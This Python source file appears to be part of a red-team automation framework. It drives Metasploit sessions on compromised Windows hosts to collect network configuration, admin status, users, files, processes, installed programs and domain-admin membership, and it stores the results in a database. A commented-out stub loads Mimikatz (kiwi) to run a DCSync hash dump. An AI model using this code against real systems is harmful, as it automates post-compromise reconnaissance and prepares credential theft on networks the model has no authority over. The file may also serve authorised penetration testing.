#!/usr/bin/env python3
from data.recon import Recon
from data.recon import ReconFiles
from data.recon import ReconDomain
from data.recon import ReconNetwork
from data.session import Session
from data.event import Event, EventUtils
from pymetasploit3.msfrpc import MsfError
import re
import time
from src.masterLogger import masterLogger
logger = masterLogger('logs', 'logs/lib.log', __name__)

class Reconnaissance():
    '''
    Main use is to gain info on the session, store it, and use it later.
    @TODO
    make different methods for powershell and cmdshell
    timeout function for powershell if it's blocked
    '''

    def gatherNetwork(self, msfclient, sessionInput):
        EventUtils.settingEvent(self, "Gathering network info on session " + sessionInput + ".")
        try:
            session = Session.objects(_id=sessionInput).first()
            ip = msfclient.client.sessions.session(sessionInput).run_psh_cmd("ipconfig /all", timeout=30)
            if session:
                recon = Recon.objects(session_id=sessionInput).first()
                if recon:
                    self.parseIPData(recon, ip)
                else:
                    recon = Recon()
                    recon.session_id = sessionInput
                    recon._id = sessionInput
                    session.recon_id.append(recon.session_id)
                    self.parseIPData(recon, ip)
            recon.save()
            session.save()
        except MsfError:
            print(f"[!]Session {sessionInput} threw timeout error.")
            print("[!]Killing session...")
            msfclient.client.consoles.console(msfclient.console).write(f'sessions -k {sessionInput}')
            time.sleep(10)
            pass

    def gatherCurrentAdmin(self, msfclient, sessionInput):
        EventUtils.settingEvent(self, "Gathering current admin on session " + sessionInput + ".")
        try:
            admin = msfclient.client.sessions.session(sessionInput).run_psh_cmd("net sessions", timeout=30)
            session = Session.objects(_id=sessionInput).first()
            if session:
                recon = Recon.objects(session_id=sessionInput).first()
                if recon:
                    for lines in admin.splitlines():
                        if not 'Access is denied.' in lines:
                            recon.isAdmin = True
                        else:
                            recon.isAdmin = False
                else:
                    recon = Recon()
                    recon.session_id = sessionInput
                    recon._id = sessionInput
                    session.recon_id.append(recon.session_id)
                    for lines in admin.splitlines():
                        if not 'Access is denied.' in lines:
                            EventUtils.settingEvent(self, "Session "+sessionInput+" is admin.")
                            recon.isAdmin = True
                        else:
                            EventUtils.settingEvent(self, "Session "+sessionInput+" is not admin.")
                            recon.isAdmin = False
            recon.save()
            session.save()
        except MsfError:
            print(f"[!]Session {sessionInput} threw timeout error.")
            print("[!]Killing session...")
            msfclient.client.consoles.console(msfclient.console).write(f'sessions -k {sessionInput}')
            time.sleep(10)
            pass

    def gatherWhoAmI(self, msfclient, sessionInput):
        EventUtils.settingEvent(self, "Gathering whoami data from session " + sessionInput +".")
        try:
            whoami_input = []
            whoami = msfclient.client.sessions.session(sessionInput).run_psh_cmd("whoami", timeout=30)
            session = Session.objects(_id=sessionInput).first()
            if session:
                recon = Recon.objects(session_id=sessionInput).first()
                if recon:
                    whoami_input = whoami.splitlines()
                    recon.whoami = whoami_input[1]
                else:
                    recon = Recon()
                    recon.session_id = sessionInput
                    recon._id = sessionInput
                    session.recon_id.append(recon.session_id)
                    for lines in whoami.splitlines():
                        if lines == '':
                            pass
                        else:
                            recon.whoami = lines
            recon.save()
            session.save()
            EventUtils.settingEvent(self, "whoami data for session " +sessionInput+ ": " +recon.whoami+".")
        except MsfError:
            print(f"[!]Session {sessionInput} threw timeout error.")
            print("[!]Killing session...")
            msfclient.client.consoles.console(msfclient.console).write(f'sessions -k {sessionInput}')
            time.sleep(10)
            pass
        except Exception as msg:
            logger.info(msg)
            print("There was an error!")
            pass
    
    def gatherPWD(self, msfclient, sessionInput):
        EventUtils.settingEvent(self, "Gathering pwd from session " + sessionInput + ".")
        try:
            current_pwd = msfclient.client.sessions.session(sessionInput).run_with_output('pwd', timeout=30)
            session = Session.objects(_id=sessionInput).first()
            if session:
                recon = Recon.objects(session_id=sessionInput).first()
                if recon:
                    if recon.pwd == current_pwd:
                        pass
                    else:
                        recon.pwd = current_pwd
                        reconfiles = ReconFiles()
                        reconfiles.dir_name = current_pwd
                        recon.directory.append(reconfiles)
                else:
                    recon = Recon()
                    recon.session_id = sessionInput
                    recon._id = sessionInput
                    session.recon_id.append(recon.session_id)
                    recon.pwd = current_pwd
                    reconfiles = ReconFiles()
                    reconfiles.dir_name = current_pwd
                    recon.directory.append(reconfiles)
            recon.save()
            session.save()
        except MsfError:
            print(f"[!]Session {sessionInput} threw timeout error.")
            print("[!]Killing session...")
            msfclient.client.consoles.console(msfclient.console).write(f'sessions -k {sessionInput}')
            time.sleep(10)
            pass
        except Exception as msg:
            logger.info(msg)
            print("There was an error!")
            pass
    
    def gatherFiles(self, msfclient, sessionInput):
        EventUtils.settingEvent(self, "Gathering file info from session " + sessionInput + ".")
        try:
            desc_files = ['Mode', 'Size', 'Type', 'Last', 'Modified', 'TimeZone', 'Name']
            listofFiles = msfclient.client.sessions.session(sessionInput).run_with_output('ls', timeout=30).splitlines()
            session = Session.objects(_id=sessionInput).first()
            if session:
                recon = Recon.objects(_id=sessionInput).first()
                if not recon:
                    Reconnaissance.gatherPWD(self, msfclient, sessionInput)
                    recon = Recon.objects(_id=sessionInput).first()
                directory = Recon.objects().filter(directory__dir_name=recon.pwd)
                if directory:
                    for r in directory:
                        for d in r.directory:
                            if not d.gathered:
                                d.gathered = True
                                for f in listofFiles:
                                    file = self.parseFileData(f)
                                    if not file:
                                        pass
                                    else:
                                        files_mapped = dict(zip(desc_files, file))
                                        d.files.append(files_mapped)
                                r.save()
                            else:
                                current_files = []
                                for _dict in d.files:
                                    current_files.append(_dict['Name'])
                                for f in listofFiles:
                                    file = self.parseFileData(f)
                                    if not file:
                                        pass
                                    else:
                                        #First check if the file is in the dict
                                        if file[6] in current_files:
                                            for found_dict in d.files:
                                                if file[6]==found_dict['Name']:
                                                    self.checkingFileChanges(file, found_dict)
                                                else:
                                                    pass
                                        else:
                                        #if not, add the new file info in the dict
                                            files_mapped = dict(zip(desc_files, file))
                                            d.files.append(files_mapped)

                            r.save()
        except MsfError:
            print(f"[!]Session {sessionInput} threw timeout error.")
            print("[!]Killing session...")
            msfclient.client.consoles.console(msfclient.console).write(f'sessions -k {sessionInput}')
            time.sleep(10)
            pass
        except Exception as msg:
            logger.info(msg)
            print(msg)
            pass
    
    def gatherInstalledPrograms(self, msfclient, sessionInput):
        try:
            EventUtils.settingEvent(self, "Gathering installed program info from session " + sessionInput +".")
            program_desc = ['Name', 'Version']
            current_programs = []
            session = Session.objects(_id=sessionInput).first()
            msfclient.client.sessions.session(sessionInput).write('run post/windows/gather/enum_applications')
            time.sleep(10)
            run_post = msfclient.client.sessions.session(sessionInput).read()
            listofPrograms = run_post.splitlines()
            if session:
                recon = Recon.objects(_id=sessionInput).first()
                if recon is None:
                    recon = Recon()
                    recon._id = sessionInput
                    recon.session_id = sessionInput
                    session.recon_id.append(recon.session_id)
                else:
                    for p in listofPrograms:
                        program = self.parseProgramList(p)
                        if not program:
                            pass
                        else:
                            programs_mapped = dict(zip(program_desc, program))
                            if not recon.gathered_programs:
                                recon.installedprg.append(programs_mapped)
                            else:
                                for list in recon.installedprg:
                                    for key, value in list.items():
                                        if key in programs_mapped:
                                            pass
                                        else:
                                            recon.installedprg.append(programs_mapped)
                recon.gathered_programs = True
            recon.save()
            session.save()
        except MsfError:
            print(f"[!]Session {sessionInput} threw timeout error.")
            print("[!]Killing session...")
            msfclient.client.consoles.console(msfclient.console).write(f'sessions -k {sessionInput}')
            time.sleep(10)
            pass
        except Exception as msg:
            logger.info(msg)
            print(msg)
            pass
    
    def gatherPID(self, msfclient, sessionInput):
        try:
            EventUtils.settingEvent(self, "Gathering list of PID from session " + sessionInput + ".")
            pid_list = []
            desc_pid = ['PID', 'Name']
            run_ps = msfclient.client.sessions.session(sessionInput).run_with_output('ps', timeout=30)
            time.sleep(8)
            listofPID = run_ps.splitlines()
            for line in listofPID:
                info = line.split()
                if not line:
                    pass
                elif 'PID' in line:
                    pass
                elif '=' in line:
                    pass
                elif 'Proces' in line:
                    pass
                elif '---' in line:
                    pass
                else:
                    temp_list = [info[0], info[2]]
                    pid_mapped = dict(zip(desc_pid, temp_list))
                    pid_list.append(pid_mapped)
            return pid_list
        except MsfError:
            print(f"[!]Session {sessionInput} threw timeout error.")
            print("[!]Killing session...")
            msfclient.client.consoles.console(msfclient.console).write(f'sessions -k {sessionInput}')
            time.sleep(10)
            pass
        except Exception as msg:
            logger.info(msg)
            print(msg)
            pass

    def gatherDomain(self, msfclient, sessionInput):
        try:
            EventUtils.settingEvent(self, "Gathering domain info from session " + sessionInput + ".")
            domain = ""
            user_list = {'User': 'user', 'IP': '0.0.0.0'}
            domain_user = []
            post = msfclient.client.modules.use('post', 'windows/gather/enum_domain')
            post['SESSION'] = sessionInput
            cid = msfclient.console
            run_enum_domain = msfclient.client.consoles.console(cid).run_module_with_output(post)
            for line in run_enum_domain.splitlines():
                if '[-]' in line:
                    print("[-] Issue gathering domain info!")
                else:
                    if line.find("Domain: ") != -1:
                        domain = line.split("Domain: ",1)[1]
                    elif line.find("Controller: ") != -1:
                        domain_user_info = line.split("Controller: ", 1)[1].split()
                        user_list['User'] = domain_user_info[0].upper()
                        user_list['IP'] = domain_user_info[2].replace(')', '')
                    else:
                        print("[-] Issue gathering domain info!")
            post = msfclient.client.modules.use('post', 'windows/gather/enum_domain_group_users')
            post['GROUP'] = 'domain admins'
            post['SESSION'] = sessionInput
            run_enum_domain_group_users = msfclient.consoles.console(cid).run_module_with_output(post)
            for line in run_enum_domain_group_users.splitlines():
                if domain in line:
                    users = line.split('\\')[1]
                    if 'not' in users:
                        pass
                    else:
                        domain_user.append(users)
            session = Session.objects(_id=sessionInput).first()
            if session:
                recon = Recon.objects(_id=sessionInput).first()
                if recon is None:
                    recon = Recon()
                    recon_domain = ReconDomain()
                    recon_domain.domain = domain
                    recon_domain.domain_controller = user_list
                    recon_domain.domain_user = domain_user
            recon.save()
        except MsfError:
            print(f"[!]Session {sessionInput} threw timeout error.")
            print("[!]Killing session...")
            msfclient.client.consoles.console(msfclient.console).write(f'sessions -k {sessionInput}')
            time.sleep(10)
            pass
        except Exception as msg:
            print(msg)

                    




        # def gatherCreds(self, msfclient, sessionInput):
        #     hash_list = []
        #     desc_has = ['NTLM Hash', 'LM Hash']
        #     session = Session.objects(_id=sessionInput).first()
        #     user = session.desc
        #     run_kiwi = msfclient.sessions.session(sessionInput).run_with_output('load kiwi')
        #     time.sleep(3)
        #     run_dcsync = msfclient.sessions.session(sessionInput).run_with_output('dcsync_ntlm ' + )


    def parseProgramList(self, p):
        if not p:
            pass
        elif 'Installed' in p:
            pass
        elif 'Name' in p:
            pass
        elif '----' in p:
            pass
        elif '[+]' in p:
            pass
        elif '[*]' in p:
            pass
        elif '=' in p:
            pass
        else:
            programs = re.split(r'\s{2,}', p)
            return programs

    def parseFileData(self, f):
        file = f.split()
        if not f:
            pass
        elif 'Listing' in f:
            pass
        elif '===================================' in file[0]:
            pass
        elif '----' in f:
            pass
        elif 'Mode' in file[0]:
            pass
        else:
            return file
    
    def parseIPData(self, recon, ip):
        adapter_list = []
        for lines in ip.splitlines():
            if 'Description' in lines:
                found_adapter = lines.split(":",1)[1]
                if recon.network_adapters:
                    for network_adapters in recon.network_adapters:
                        adapter_list.append(network_adapters.adapter)
                    if found_adapter in adapter_list:
                        _adapter = None
                        pass
                    else:
                        _adapter = ReconNetwork()
                        _adapter.adapter = found_adapter
                else:
                    _adapter = ReconNetwork()
                    _adapter.adapter = found_adapter
            if 'IPv4' in lines:
                found_ip = re.findall( r'[0-9]+(?:\.[0-9]+){3}',lines)
                if found_ip:
                    if _adapter:
                        if not recon.network_adapters:
                            _adapter.ip_address = found_ip[0]
                        else:
                            for network_adapters in recon.network_adapters:
                                if network_adapters.ip_address == found_ip:
                                    break
                                else:
                                    _adapter.ip_address = found_ip[0]
                    else:
                        break
            if 'Default Gateway' in lines:
                found_defaultgateway = re.findall( r'[0-9]+(?:\.[0-9]+){3}',lines)
                if _adapter == None:
                    pass
                if found_defaultgateway:
                    _adapter.defaultgateway = found_defaultgateway[0]
            if 'DNS Servers' in lines:
                found_dns =  re.findall( r'[0-9]+(?:\.[0-9]+){3}',lines)
                if _adapter == None:
                    pass
                if found_dns:
                    _adapter.dns = found_dns[0]
            if 'DHCP Server' in lines:
                found_dhcp = re.findall( r'[0-9]+(?:\.[0-9]+){3}',lines)
                if _adapter == None:
                    pass
                if found_dhcp:
                    pass
            if 'Subnet Mask' in lines:
                found_subnet_mask = re.findall( r'[0-9]+(?:\.[0-9]+){3}',lines)
                if _adapter == None:
                    pass
                if found_subnet_mask:
                    pass
            if 'NetBIOS over Tcpip' in lines:
                if _adapter == None:
                    pass
                recon.network_adapters.append(_adapter)
    
    def checkingFileChanges(self, file, _dict):
        i = 0
        for k, v in _dict.items():
            if v == file[i]:
                i = i + 1
                pass
            else:
                _dict[k] = file[i]
                i = i + 1